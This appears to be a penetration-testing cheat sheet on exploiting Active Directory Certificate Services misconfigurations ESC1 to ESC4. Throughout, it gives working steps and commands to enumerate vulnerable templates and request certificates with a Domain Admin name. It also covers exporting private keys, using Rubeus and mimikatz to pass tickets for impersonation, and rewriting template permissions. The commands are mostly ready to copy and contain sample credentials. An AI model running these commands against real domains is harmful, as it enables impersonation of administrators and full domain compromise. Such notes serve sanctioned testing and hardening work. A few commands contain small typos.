# ADCS Various Exploitation methods and misconfigurations

## Possible tools to use: PSPKIAudit, Certify https://github.com/GhostPack/Certify , Certipy https://github.com/ly4k/Certipy , Certi https://github.com/zer1t0/certi , modifyCertTemplate https://github.com/fortalice/modifyCertTemplate

## Poisonous parameter combination on certificates

#### 1) Client Authentication = Can be used for client authentication

#### 2) Certificate Permissions = We have the required permissions to use the certificate template (Allow enroll/Allow Full Control)

#### 3) CT_FLAG_ENROLEE_SUPPLIES_SUBJECT = The certificate template allows us to specify the Subject Alternative Name (SAN) (Value=1)

#### 4) CTPRIVATEKEY_FLAG_EXPORTABLE_KEY = The certificate will be exportable with the private key

## TIP: Disable Restricted Admin mode

#### 1) Start -> Run

#### 2) mmc 

#### 3) Click file -> Add/Remove Snap-in

#### 4) Add the certificates snap-in and make sure to select Computer Account and Local computer on the prompts

#### 5) OK

## Request a personal certificate

#### 1) Right click on Personal and select All Tasks -> Request New Certificate

#### 2) Click Next twice to select the AD Enrollment policy

#### 3) You will see that we have one template that we can request, but first, we need to provide additional information.

#### 4) More information warning (click)

#### 5) Change the Subject name Type option to Common Name and provide any value, since it doesn't matter, and click Add.

#### 6) Change the Alternative name Type option to User Principal Name (UPN)

#### 7) Supply the UPN of the user you want to impersonate ( It can be a Domain Admin account NAME@DOMAIN and click Add

#### 8) Apply and OK. Select certificate and click Enroll

## Export Certificate

#### 9) Right click on the certificate and select ALL Tasks -> Export 

#### 10) Click next, select yes, export the private key, then next

#### 11) Next, then set password for the certificate since the private key cannot be exported without a password

#### 12) Next and select a location to store certificate

#### 13) Next and Finally, Finish.

## Impersonation through a certificate

#### 1) Rubeus.exe asktgt /user:USER /enctype:aes256 /certificate:PATH/TO/CERTIFICATE /password:CERT_PASS /outfile:TICKET.KIRBI /domain:DOMAIN /dc:DC_IP

#### 2) mimikatz.exe

#### 3) privilege::debug

#### 4) kerberos::ptt TICKET.KIRBI

#### 5) exit

#### 6) ENJOY!

# AD Certificate Services Enumeration

### AD's certificate services can be enumerated through LDAP queries, revealing information about Enterprise Certificate Authorities (CAs) and their configurations. This is accessible by any domain-authenticated user without special privileges. Tools like Certify and Certipy are used for enumeration and vulnerability assessment in AD CS environments.

## Commands:

 - Certify.exe cas (Enumerate trusted root CA certificates and Enterprise CAs with Certify)

 - Certify.exe find /vulnerable (Identify vulnerable certificate templates with Certify)

 - certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 (Use Certipy for enumeration and identifying vulnerable templates)

### Enumerate Enterprise CAs and certificate templates with certutil

 - certutil.exe -TCAInfo

 - certutil -v -dstemplate
 
 - certutil.exe -config - -ping , certutil -dump (Enumerate AD Enterprise CAs)

 - crackmapexec ldap domain.lab -u username -p password -M adcs (Find ADCS server)

 - ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=USER,OU=USERS,DC=DOMAIN,DC=LOCAL' -w 'PASSWORD' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=DOMAIN,DC=LOCAL" dNSHostName

# ESC1 - Misconfigured Certificate Templates

### Domain Users can enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.

## Requirements

#### 1) Template that allows for AD authentication

#### 2) ENROLLEE_SUPPLIES_SUBJECT flag

#### 3) PKINIT Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage)

## Exploitation

#### 1) Use Certify.exe to see if there are any vulnerable templates

 - Certify.exe find /vulnerable

 - Certify.exe find /vulnerable /currentuser

 - certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128

 - (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))

#### 2) Use Certify, Certi or Certipy to request a Certificate and add an alternative name (user to impersonate)

 - Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin

 - certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'

#### 3) Use OpenSSL and convert the certificate, do not enter a password

 - openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider" -out cert.pfx

#### 4) Move the cert.pfx file to the target machine filesystem and request a TGT for the altname user using Rubeus

 - Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx /ptt

 - certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100


## WARNING! These certificates will still be usable even if the user or computer resets their password!

# ESC2 - Misconfigured Certificate Templates

## Requirements

### Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)

## Exploitation

#### 1) Find template

 - (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))

#### 2) Request a certificate specifying the /altname as a domain admin like in ESC1

# ESC3 - Misconfigured Enrollment Agent Templates

### ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users

## Exploitation

#### 1) Request a certificate based on the vulnerable certificate template ESC3.

 - Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent

 - certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

#### 2) Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user

 - Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf

 - certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

#### 3) Use Rubeus with the certificate to authenticate as the other user

 - Rubeus.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf

# ESC4 - Access Control Vulnerabilities

### Enabling the mspki-certificate-name-flag flag for a template that allows for domain authentication, allow attackers to "push a misconfiguration to a template leading to ESC1 vulnerability

### ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

## Exploitation

#### 1) Search for WriteProperty with value 00000000-0000-0000-0000-000000000000 using modifyCertTemplate

 - python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP

#### 2) Add the ENROLLEE_SUPPLIES_SUBJECT (ESS) flag to perform ESC1

 - python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP

 - C:\>StandIn.exe --adcs --filter WebServer --ess --add (Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template)

#### 3) Perform ESC1 and then restore the value

 - python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP

### Using Certipy

#### 1) Make template vulnerable to ESC1

 - certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

#### 2) Exploit ESC1

 - certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

#### 3) Restore config

 - certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
